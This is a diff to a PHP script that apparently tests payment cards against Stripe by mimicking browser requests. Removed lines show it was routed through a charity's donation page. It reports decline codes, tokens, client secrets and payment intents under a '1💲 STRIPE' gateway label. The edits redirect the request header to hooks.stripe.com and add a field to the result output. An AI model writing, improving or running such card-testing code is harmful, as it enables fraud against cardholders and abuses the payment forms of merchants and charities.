@@ -251,9 +251,8 @@ curl_setopt($ch, CURLOPT_URL, $stripejs);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 $headers = array();
-$headers[] = 'authority: lcc.lt';
+$headers[] = 'authority: hooks.stripe.com';
 $headers[] = 'method: GET';
-$headers[] = 'path: /donate/donate-annual-fund';
 $headers[] = 'scheme: https';
 $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
 $headers[] = 'accept-language: en-US,en;q=0.9';
@@ -427,7 +426,7 @@ Time -» <b>$time</b><b>s</b>
 <b>Status -» Declined! ❌
 Response -» $errormessage | 
 Decline Error -» $errorcode
-Result -» $result2 | Token - $id | HahsVal - $hashval | SessionToken - $sesstok | ClientSecret - $clientsecretpi $clientsecretsrc | PaymentIntent - $intent | URL - $stripejs | SourceSRC - $sourcesrc | FinalURL - $final | Verification - $respauth | Messgae- $errormessage5 | Auth - $auth | ResponseAuth - $respauth
+Result -» $result2 | Token - $id | HahsVal - $hashval | HookStripe- $resp4 SessionToken - $sesstok | ClientSecret - $clientsecretpi $clientsecretsrc | PaymentIntent - $intent | URL - $stripejs | SourceSRC - $sourcesrc | FinalURL - $final | Verification - $respauth | Messgae- $errormessage5 | Auth - $auth | ResponseAuth - $respauth
 Gateway -» 1💲 STRIPE
 Time -» <b>$time</b><b>s</b>
 
